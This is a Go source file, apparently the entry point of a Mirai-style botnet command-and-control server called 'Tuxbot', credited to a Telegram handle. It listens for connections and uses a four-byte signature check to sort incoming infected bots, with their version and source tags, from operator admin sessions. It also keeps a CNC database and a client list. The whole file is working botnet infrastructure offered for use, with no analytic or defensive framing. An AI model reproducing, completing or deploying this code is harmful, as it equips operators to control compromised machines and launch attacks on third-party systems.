package main

//  @anessdev on telegram

import (
    "errors"
    "fmt"
    "net"
    "os"
    "time"
)

const DatabasePath string = "cnc.db"
var database *Database = NewDatabase(DatabasePath)
var clientList = NewClientList()

func main() {
    go StartAPIServer(database)

    if _, err := os.Stat("status.txt"); os.IsNotExist(err) {
        os.WriteFile("status.txt", []byte("ON"), 0644)
    }

    tel, err := net.Listen("tcp", "0.0.0.0:1999")
    if err != nil {
        fmt.Println(err)
        return
    }

    fmt.Println("Tuxbot Now Listening to cnc server")

    for {
        conn, err := tel.Accept()
        if err != nil {
            fmt.Println("could not connect to Tuxbot cnc:", err)
            break
        }
        go initialHandler(conn)
    }

    fmt.Println("ERROR: run ulimit -n 999999")
}

func initialHandler(conn net.Conn) {
    defer conn.Close()
    conn.SetDeadline(time.Now().Add(10 * time.Second))

    buf := make([]byte, 4) // Read exactly 4 bytes for signature check
    l, err := conn.Read(buf)
    if err != nil || l < 4 {
        NewAdmin(conn).Handle()
        return
    }

    // signature: [0, 0, 0, version]
    if buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
        version := buf[3]
        source := ""
        if version > 0 {
            lenBuf := make([]byte, 1)
            if n, err := conn.Read(lenBuf); err == nil && n > 0 && lenBuf[0] > 0 {
                source_buf := make([]byte, lenBuf[0])
                conn.Read(source_buf)
                source = string(source_buf)
            }
        }
        NewBot(conn, version, source).Handle()
    } else {
        NewAdmin(conn).Handle()
    }
}

func readXBytes(conn net.Conn, buf []byte) error {
    tl := 0
    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed")
        }
        tl += n
    }
    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}